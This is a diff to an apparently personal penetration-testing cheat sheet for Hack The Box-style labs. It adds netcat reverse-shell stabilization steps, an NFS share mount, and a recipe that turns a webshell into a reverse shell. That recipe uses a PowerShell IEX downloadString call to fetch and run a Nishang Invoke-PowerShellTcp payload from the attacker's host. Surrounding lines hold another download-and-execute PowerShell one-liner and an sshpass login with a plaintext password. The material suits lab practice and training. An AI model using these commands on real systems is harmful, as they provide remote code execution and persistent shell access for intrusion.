@@ -20,6 +20,17 @@ http://10.10.10.15/0xdf.txt - the file to move
 ### Spawn shell via Python
 `python3 -c 'import pty;pty.spawn("/bin/bash")' `
 
+### Stabilize shell (run the python pty above first)
+```
+alex@squashed:/var/www/html$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+oxdf@hacky$ stty raw -echo ; fg
+nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+``` 
+
 ### grep for a string in a dir of files
 `grep -ls 'pass' ${PWD}/* `
 
@@ -28,6 +39,9 @@ http://10.10.10.15/0xdf.txt - the file to move
 
 ### Escape restricted shell with sshpass
 `sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash` 
+
+### Mount an NFS share that has ACL applied (root squashing)
+` sudo nfspysh -o server=10.10.11.191:/var/www/html` 
 
 ------------------------------------------
 # Windows 
@@ -49,6 +63,17 @@ http://10.10.10.15/0xdf.txt - the file to move
 if running as 32 bit, call the powershell from `C:\windows\sysNative` instead of `C:\windows\system32` 
 Example - `C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')`  
 More info in writeup for [Optimum](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
+
+## Webshell to reverse shell with powershell
+```
+From Webshell, it’s time to get an interactive shell. I’ll go with my Windows stand-by, Nishang Invoke-PowerShellTcp.ps1.
+
+Make a copy of it in the local directory.
+Add a line to the end: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443
+Start python3 -m http.server 80 in that same directory
+Start nc -lnvp 443
+Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/Invoke-PowerShellTcp.ps1%27)
+``` 
 
 --------------------------------------------
 # File Transfers 
